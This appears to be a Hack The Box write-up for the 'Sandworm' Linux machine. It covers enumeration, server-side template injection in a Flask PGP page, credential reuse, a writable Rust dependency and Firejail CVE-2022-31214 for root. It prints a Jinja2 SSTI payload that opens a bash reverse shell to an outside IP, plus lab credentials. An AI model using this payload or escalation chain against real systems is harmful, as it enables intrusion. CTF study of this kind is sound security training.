---
title: Sandworm Notes
date: 2023-08-18 12:00:00 pm
categories: [HTB]
tags: [HTB, Linux, Medium, SSTI, CVE-2022-31214]

img_path: /assets/img/htb/writeups/sandworm
---

* * *

#  Sandworm Notes

* * *

## **Information gathering**

* * *

**Scope:** 10.10.11.218/32 (Linux)

![](target_connection.png)

**TCP Nmap scan:** 65,535 ports

![](nmap_all_ports_TCP.png)

* **Open ports**:
	* **22/ssh (Secure Shell Protocol)**
		* Banner Grabbing
			* Service
				* OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
					* Latest version: [OpenSSH 9.4](https://www.openssh.com/txt/release-9.4)/[9.4p1](https://www.openssh.com/txt/release-9.4) (2023-08-10)
			* Authentication: (publickey, password)
		* Valid credentials
			* None

	* **80/http (Hypertext Transfer Protocol)**
		* Banner Grabbing
			* Redirection: https://ssa.htb/ (10.10.11.218:443)
				![](http_banner_grabbing_curl.png)
				* Add domain to **Local DNS Server** (/etc/hosts)
					* echo "10.10.11.218 ssa.htb" \| sudo tee -a /etc/hosts
	 
	  * **443/https (Hypertext Transfer Protocol Secure)**
		*  Location: https://ssa.htb/
			* Banner Grabbing
				* Technologies
					* HTTPServer: Ubuntu Linux (nginx/1.18.0)
					* Jquery
					* Flask & trade
				* Web Interface
					* FIrefox
						![](https_web_firefox.png)
				* Posible user: atlas@ssa.htb
					![](https_banner_grabbing_openssl.png)
				* Url Scrapping
					![](https_url_scrapping.png)
				* Directory enumeration:
					![](https_fuzzing_dir.png)
					* https://ssa.htb/guide
						* PGP Encryption (Pretty Good Privacy): Encryption system used for both sending encrypted emails and encrypting sensitive files
							* Generate key
								![](generate_key.png)
							* Then create message, signed it and export public key
								![](signed_process.png)
							* Finally use them in web service and we get valid verification
								![](https_guide_valid_signature.png)
					* https://ssa.htb/pgp
						![](gpg_public_key.png)
					* https://ssa.htb/login
						* Valid credentials: None
						![](https_login_panel.png)

## **Vulnerability assessment**

* * *
* * *

* In the signature verification result we view some output when we created out public key
![](https_guide_valid_signature.png)
* In addition, from our enumeration we know that the site uses the flask framework to set up the web
	* **SSTI (Server Site Template Injection)**
		* Is possible when an attacker injects template directive as user input that can execute arbitrary code on the server
		* **PoC**: [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)
			* We generate our public key, but this time we write on field that is reflected (Name) this: \{\{7\*7\}\}
			* If we look at output 49, we will known that is vulnerable (VULNERABLE)
				![](PoC_STTI.png)
				* SSTI bash script Enumeration:
					![](ssti_PoC.png)
					* Mysql credentials:
						* mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA

## **Exploitation**

* * *
* * *

* **SSTI (Server Site Template Injection)**: [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)
	* Using \_\_class\_\_ and \_\_mro\_\_ objects: (ssti.sh) [https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_Sandworm](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_Sandworm)
		* Searching **Subprocess.Popen** classs to execute commands
		* Payload: \{\{''.\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()\[439\](\"bash -c 'bash -i >& /dev/tcp/10.10.15.5/4444 0>&1'\",shell=True,stdout=-1).communicate()\}\}
		![](ssti_rce_shell.png)

## **Post-exploitation**

* * *
* * *

* System User (Atlas)
	* (Sandbox): A sandbox is a type of software testing environment that enables the **isolated execution of software or programs for independent evaluation**
		* Firejail: Firejail is a **SUID sandbox program** that reduces the risk of security breaches by **restricting the running environment of untrusted applications** using Linux namespaces, seccomp-bpf and Linux capabilities
	* Home directory enumeration (atlas)
		* HTTPie: Provides a **simple http command** that allows for sending arbitrary HTTP requests using a simple and natural syntax
		* ~/.config/httpie/sessions/localhost_5000/admin.json
			![](config_credentials.png)
			* Credentials: **silentobserver:quietLiketheWind22** (system user /etc/passwd)
				* Web service login
				![](https_admin_panel.png)

## **Lateral movement**

* * *
* * *

* System credentials Reuse: **silentobserver:quietLiketheWind22**
	![](silentobserver_ssh.png)
	* Enumeration (silentobserver)
		* SUID files
			* Owner: Atlas user
				* /opt/tipnet/target/debug/tipnet
					* Dependencies files: /opt/tipnet/target/debug/tipnet.d
						* /opt/crates/logger/src/lib.rs (-rw-r**w**-r-- 1 atlas **silentobserver**)
						* FIle modification Rust RCE:
							![](rust_list_modification_rce.png)
				* /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
				* /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
		* Process script (pspy.sh)
			![](pspy.png)
			* We can view the execution of **Cargo** and the **previos Rust script (tipnet)and dependencies (tipnet.d)**:
				* Cargo is a default tool for managing dependencies in **Rust**
* Reverse shell like user **Atlas**
	![](atlas_access.png)
	* Persistence: **create pair rsa keys and add pubkey to authorized keys**
	* Enumeration
		* /usr/local/bin/firejail (0.9.68) (**CVE-2022-31214**) [https://nvd.nist.gov/vuln/detail/CVE-2022-31214](https://nvd.nist.gov/vuln/detail/CVE-2022-31214)
			* Exploit [https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)
			![](root.png)

## **Proof of concept**

* * *
* * *